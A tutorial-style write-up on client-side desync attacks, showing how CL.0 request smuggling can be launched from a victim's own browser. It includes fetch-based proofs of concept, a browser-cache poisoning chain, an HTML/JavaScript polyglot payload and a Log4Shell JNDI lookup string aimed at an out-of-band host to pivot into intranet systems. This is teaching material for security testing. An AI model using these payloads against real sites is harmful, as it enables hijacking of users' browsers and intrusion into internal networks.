# Client-Side Desync Attacks

This technique takes everything we've learned from CL.0 request smuggling and flips it in a surprising direction: instead of desyncing a connection between a **front-end and back-end server**, you desync a connection between a **victim's own browser and the website**. And unlike almost everything else in this series, this one can be triggered using requests a normal browser will happily send — no special tools needed on the victim's end.

---

## Why This Is a Big Deal

Every technique covered so far required weird, malformed requests — the kind of stuff only tools like Burp Repeater can send. Regular browsers refuse to send intentionally broken requests, which is exactly why request smuggling has always been considered a **server-side-only** problem, limited to sites using a front-end/back-end setup.

**CL.0 broke that assumption.** Remember: a CL.0 vulnerability doesn't need any obfuscation or malformed headers — just a back-end that quietly decides to ignore a perfectly normal `Content-Length` header. Since nothing about that payload is "broken" by browser standards, **a browser will send it without complaint.**

That opens the door to a whole new class of attack: **Client-Side Desync (CSD)**.

---

## What Is a Client-Side Desync?

> A CSD attack tricks the **victim's own browser** into desyncing its connection with the vulnerable website.

This is fundamentally different from classic smuggling:

| | Classic Request Smuggling | Client-Side Desync |
|---|---|---|
| **What gets desynced** | Connection between front-end ↔ back-end | Connection between browser ↔ server |
| **Who sends the malicious request** | The attacker (via a tool) | The **victim**, unknowingly, via their own browser |
| **Requires 2 servers (front-end + back-end)?** | ✅ Yes | ❌ No — works even on single-server sites |
| **Can it hit intranet/internal sites?** | ❌ No (attacker can't reach them directly) | ✅ Yes — the victim's browser can |

Because this attack doesn't rely on two different servers disagreeing with each other, it works on **single-server websites** too — sites that were previously considered completely immune to request smuggling.

---

## How It Works, Step by Step

```
1. Victim visits a malicious page (on an unrelated domain)
                │
                ▼
2. Hidden JavaScript makes the victim's browser send a
   POST request to the vulnerable site, with a malicious
   "prefix" stuffed in the body (just like CL.0 smuggling)
                │
                ▼
3. The server responds to that request as normal... but
   doesn't fully consume the body. The malicious prefix is
   left sitting on the connection, unprocessed.
                │
                ▼
4. The JavaScript then makes the browser send a SECOND,
   completely normal-looking request down that SAME
   (now-poisoned) connection
                │
                ▼
5. The server glues your leftover prefix onto this second
   request — and the victim gets a response that was
   actually meant for your injected prefix
```

### Important requirement: HTTP/1.1 connection reuse

This entire attack depends on the browser **reusing the same TCP connection** for multiple requests — which is normal behavior for HTTP/1.1, but not for HTTP/2 (browsers handle HTTP/2 streams differently, so there's no equivalent desync opportunity). **If the target server supports HTTP/2, this attack generally won't work**, since browsers prefer HTTP/2 whenever it's available.

*(Exception: if you expect your victim to be accessing the site through an old forward proxy that only speaks HTTP/1.1, this attack can still apply even if the target itself supports HTTP/2.)*

---

## Finding a Vulnerable Endpoint

**Step 1 — Probe for a desync vector:** send a request where the declared `Content-Length` is **longer** than the actual body you send.

- **Hangs / times out** → the server is correctly waiting for the rest of the body. Not vulnerable (at least not this way).
- **Responds immediately, without waiting for the rest** → 🎯 potential CSD vector! The server ignored part of your declared body length.

Just like CL.0, the best candidates tend to be endpoints that don't expect a body at all — static files, or endpoints that trigger a server-level redirect.

**Alternative: provoke a server error.** Since this all has to work through an actual browser, you're limited to only the parts of a request a browser lets JavaScript control cross-domain — basically just the URL, the body, and a couple of odds and ends like `Referer` and part of `Content-Type`.

### Example: sneaking odd characters into allowed fields

```http
Referer: https://evil-user.net/?%00
Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
```

### Example: directory traversal to trigger an error

Browsers "clean up" obviously malformed paths before sending them — so you need to URL-encode the traversal sequence to sneak it through:

```http
GET /%2e%2e%2f HTTP/1.1
```

**Step 2 — Confirm it in Burp:** some servers respond early but still correctly process the body once it arrives later — not exploitable. Others respond early *and* then immediately close the connection — also not exploitable (no connection left to poison). To rule these out, send two requests down the **same** connection and check whether the first request's body actually messes with the second request's response — the same confirmation method used for CL.0.

## Reproducing the Desync in an Actual Browser

Once you've confirmed the vector in Burp, you need to prove it also works through a real browser — since that's ultimately how the victim will trigger it.

### Setup tips

- Use a plain browser (Chrome recommended) with **no proxy** and **no extensions** — anything that intercepts traffic can distort the result.
- Launch the attack from a different domain than the target (simulating the victim visiting an attacker-controlled page), over HTTPS.
- In DevTools → Network tab, enable **Preserve log** and the **Connection ID** column, so you can see which requests share a connection.

### Example JavaScript proof of concept

```javascript
fetch('https://vulnerable-website.com/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // the malicious prefix
    mode: 'no-cors',      // keeps the connection ID visible for debugging
    credentials: 'include' // ensures cookies are sent, poisoning the right connection pool
}).then(() => {
    location = 'https://vulnerable-website.com/' // the follow-up request, using the poisoned connection
})
```

**What to look for:** two requests appear on the Network tab. If the *second* one (a totally normal navigation to `/`) comes back with the response meant for your malicious prefix (e.g. an unexpected `404`), the desync worked. 🎯

**Why `credentials: 'include'` matters:** browsers keep *separate* connection pools for requests sent with cookies versus without. You want to poison the pool that's actually used for authenticated requests, since that's the one your exploit needs.

### Handling redirects

Many good CSD vectors are endpoints that trigger a redirect — but browsers automatically *follow* redirects, which can mess up your attack sequence. The fix: deliberately trigger a CORS error so the browser refuses to follow the redirect, then continue your attack from the `.catch()` handler instead of `.then()`:

```javascript
fetch('https://vulnerable-website.com/redirect-me', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors', // intentionally triggers a CORS error on a redirect
    credentials: 'include'
}).catch(() => {
    location = 'https://vulnerable-website.com/'
})
```

## Exploiting It: Same Old Tricks, New Delivery Method

Once you can reliably desync a victim's browser, you can reuse most of the classic server-side smuggling attack playbook — the difference is just *how* the attack gets delivered (via a victim visiting a malicious page, instead of an attacker directly firing requests).

### Client-Side Cache Poisoning (an easier path to resource hijacking)

Earlier docs covered turning an on-site redirect into an open redirect to hijack JavaScript resource imports. You *can* do the same thing here, but timing a live desync to coincide with a resource load is fiddly. **Much easier approach: poison the browser's own cache instead.**

High-level flow:

1. **Desync the connection**, with the injected prefix set up to trigger a redirect to an attacker-controlled domain.
2. **Follow up with a request for the real target resource** (e.g. a JavaScript file) — this gets the *redirect* response cached under that resource's cache key.
3. Later, **navigate the browser to a page that imports that resource** — thanks to the poisoned cache, the browser serves up the attacker's redirect instead of the real file.
4. **Deliver an actual payload** at that point (see below).

```javascript
fetch('https://vulnerable-website.com/desync-vector', {
    method: 'POST',
    body: 'GET /redirect-me HTTP/1.1\r\nFoo: x',
    credentials: 'include',
    mode: 'no-cors'
}).then(() => {
    location = 'https://vulnerable-website.com/resources/target.js'
})
```

⚠️ **Important nuance:** the follow-up request that actually gets cached needs to be a real top-level page navigation (changing `location`), not a background `fetch()` call — browsers partition their cache differently depending on how a resource was requested, so a `fetch()`-triggered load would poison the wrong cache entry.

### The Payload Problem: HTML vs. JavaScript

Here's a subtlety: your malicious page is initially loaded and executed as **HTML**. But later, when the poisoned cache redirects the browser back to your page (expecting to load a **JavaScript** file this time), your page needs to work as valid JS too — otherwise nothing executes.

**Solution: a polyglot payload** — valid in both HTML and JavaScript at once, using comment syntax to "hide" each language's content from the other:

```javascript
alert(1);
/*
<script>
    fetch( ... )
</script>
*/
```

- Loaded as **HTML** → only the `<script>` block executes (the `alert(1); /*` and `*/` lines are just inert text outside the tag).
- Loaded as **JavaScript** → only `alert(1);` executes — everything from `/*` to `*/` is treated as a comment and ignored.

This way, the same file behaves correctly no matter which "mode" the browser loads it in.

## Pivoting Attacks Against Internal/Intranet Sites

This is arguably the scariest implication of CSD attacks. Normally, attacks that require crafting unusual *headers* (not just the body/URL) are off-limits for browser-based attacks — a browser will never let your JavaScript set an arbitrary `User-Agent` header, for example.

### Example of something a browser normally *can't* send

```http
GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

(This is a reference to the Log4Shell-style payload — something that needs to land inside a specific header, which JavaScript running in a browser can't directly control.)

**But with a client-side desync, you don't need to control that header directly.** You can smuggle it inside the *body* of a request you *can* send (since the body is fully attacker-controlled) — and let the desync turn that body content into a brand-new request, complete with whatever headers you put in it:

```http
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 etc.
Content-Length: 86

GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

**Why this matters so much:** all of this traffic originates from the **victim's own browser**. That means you can potentially pivot attacks onto any website the victim has access to — including **internal company intranets** or **IP-restricted systems** that you, the attacker, could never reach directly yourself. The victim's browser becomes your unwitting proxy into networks you'd otherwise have no access to at all.

| **Key requirement** | Target must use HTTP/1.1 (not HTTP/2) with connection reuse |

| **Payload trick** | Polyglot HTML/JS files so the same page works whether loaded as a page or as a script |
